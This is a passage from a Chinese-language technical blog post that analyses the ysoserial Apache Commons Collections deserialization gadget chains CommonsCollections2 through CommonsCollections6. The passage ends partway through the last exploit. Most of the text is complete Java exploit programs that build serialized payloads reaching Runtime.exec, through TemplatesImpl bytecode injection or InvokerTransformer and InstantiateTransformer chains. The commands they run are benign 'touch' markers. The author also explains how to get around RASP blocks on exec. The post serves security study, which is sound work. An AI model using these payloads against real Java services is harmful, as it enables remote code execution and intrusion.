class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>); <span class="comment">// 这里 insertBefore 还是 After 都一样</span></span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>, <span class="keyword">new</span> Class[]&#123;&#125;, <span class="keyword">new</span> Object[]&#123;&#125;);</span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(invokerTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>生成字节码用的是 ysoseiral 一样的 javassist, 可以在正常的字节码前后插入恶意 payload.<br>另外这里因为是运行的字节码, 所以其实变通方法很多, 如果只是想读写文件但有 RASP ban 掉了 Runtime.exec, 其实可以通过 File 来读写文件.  </p>
<p>4 的修复方法比较粗暴, 直接干掉了 InvokerTransformer 的 Serializable 继承.  </p>
<p><img src="https://i.loli.net/2020/01/27/2aVoPLzdcXFfRj5.png" alt=""></p>
<h2 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h2><p>这个与上面的 CommonsCollections1 接近, 区别是将一串的 InvokerTransformer 换成了 InstantiateTransformer, 利用刚刚在 CommonsCollections2 介绍的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 导致 RCE. 本质是换汤不换药.</p>
<p>InstantiateTransformer 做的工作是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(input <span class="keyword">instanceof</span> Class)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InstantiateTransformer: Input object was not an instanceof Class, it was a "</span> + (input == <span class="keyword">null</span> ? <span class="string">"null object"</span> : input.getClass().getName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Constructor con = ((Class)input).getConstructor(<span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(<span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>就是将类实例化, 也就是调用 input 的构造函数, 这里 InstantiateTransformer 能替换 InvokerTransformer 的原因是内置类 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 在构造时,  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">TrAXFilter</span><span class="params">(Templates templates)</span> <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>._templates = templates;</span><br><span class="line">    <span class="keyword">this</span>._transformer = (TransformerImpl)templates.newTransformer();</span><br><span class="line">    <span class="keyword">this</span>._transformerHandler = <span class="keyword">new</span> TransformerHandlerImpl(<span class="keyword">this</span>._transformer);</span><br><span class="line">    <span class="keyword">this</span>._overrideDefaultParser = <span class="keyword">this</span>._transformer.overrideDefaultParser();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会调用 templates 的 newTransformer 方法, 其实这里 InstantiateTransformer 起到的作用是和 InvokerTransformer 一样的.</p>
<p>exp 如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(CommonsCollections3.Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(CommonsCollections3.Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertAfter(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h2><p>这个与上面的 CommonsCollections2 接近, 区别是将 InvokerTransformer 替换为 InstantiateTransformer, 换汤不换药 + 1, 不再多做解释  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections4</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Placeholder</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String AbstractTranslet = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span>;</span><br><span class="line">        String TemplatesImpl = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>;</span><br><span class="line">        String TrAXFilter = <span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span>;</span><br><span class="line"></span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Placeholder.class));</span><br><span class="line">        classPool.insertClassPath(<span class="keyword">new</span> ClassClassPath(Class.forName(AbstractTranslet)));</span><br><span class="line"></span><br><span class="line">        CtClass placeholder = classPool.get(Placeholder.class.getName());</span><br><span class="line">        placeholder.setSuperclass(classPool.get(Class.forName(AbstractTranslet).getName()));</span><br><span class="line">        placeholder.makeClassInitializer().insertBefore(<span class="string">"java.lang.Runtime.getRuntime().exec(\"touch /dev/shm/rmb122_test1\");"</span>);</span><br><span class="line">        placeholder.setName(<span class="string">"demo.rmb122."</span> + System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytecode = placeholder.toBytecode();</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(TemplatesImpl).getConstructor(<span class="keyword">new</span> Class[]&#123;&#125;).newInstance();</span><br><span class="line">        Field fieldByteCodes = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        fieldByteCodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldByteCodes.set(templates, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;bytecode&#125;);</span><br><span class="line"></span><br><span class="line">        Field fieldName = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        fieldName.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        fieldName.set(templates, <span class="string">"rmb122"</span>);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Class.forName(TrAXFilter)),</span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(<span class="keyword">new</span> Class[]&#123;Templates.class&#125;, <span class="keyword">new</span> Object[]&#123;templates&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="keyword">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] innerArr = (Object[]) field.get(queue);</span><br><span class="line">        innerArr[<span class="number">0</span>] = templates;</span><br><span class="line">        innerArr[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">        field = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><p>这个不是换汤不换药了, 用了一个新的利用链去触发 InvokerTransformer, 不过 ysoserial 上注释里面的调用链是错误的, 估计是忘记改了. 正确的如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        BadAttributeValueExpException.readObject()</span><br><span class="line">            TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>从注释里面还可以得到, 这个 chain 只能用于 &gt;= 8u76, 且 SecurityManager 未设置的情况下使用.<br>原因是在 8u76 的更新里面, 添加了 <code>javax.management.BadAttributeValueExpException</code> 的 readObject 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">            || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到, 在 <code>System.getSecurityManager() == null</code> 的情况下, 将会不管 valObj 的类型, 调用 toString 方法, 这里需要配合 <code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 来使用, 其重写的 toString 方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到熟悉的 map.get 了么, 这里就又回到了 LazyMap 的那一套, 接下来也不用多说了, exp 如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections5</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/asdasd_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="string">"placeholder"</span>);</span><br><span class="line">        Field field = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(badAttributeValueExpException);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外, 这一条链, 其实 3, 4 都能使用, 不过 ysoseiral 只在 exp 里面写了 3 的, 实际上只要将 import 的 xxx.collections.xxx 全改成 xxx.collections4.xxx, 然后将 <code>LazyMap.decorate</code> 改为 <code>LazyMap.LazyMap</code> 就能直接给 4 使用.</p>
<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p>还是先看调用栈:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    java.io.ObjectInputStream.readObject()</span><br><span class="line">        java.util.HashSet.readObject()</span><br><span class="line">            java.util.HashMap.put()</span><br><span class="line">            java.util.HashMap.hash()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="line">                org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="line">                    org.apache.commons.collections.map.LazyMap.get()</span><br><span class="line">                        org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="line">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="line">                        java.lang.reflect.Method.invoke()</span><br><span class="line">                            java.lang.Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>这条与 CommonsCollections5 类似, 触发点由 BadAttributeValueExpException 改为 HashSet, 这里与 URLDNS 类似, 在反序列化时会重新计算对象的 hashCode, 而刚刚好 TiedMapEntry 的 hashCode 里面与 toString 一样也用到了 getValue.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.getValue();</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">this</span>.getKey() == <span class="keyword">null</span> ? <span class="number">0</span> : <span class="keyword">this</span>.getKey().hashCode()) ^ (value == <span class="keyword">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>不过这里比较奇怪的是 HashMap 就已经有 hashCode 了, 不知道为什么还要再套一层 HashSet. 我自己重新编写的时候是直接用的 HashMap 作为触发点.</p>
<p>exp 如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] fake = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="string">"placeholder"</span>),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> 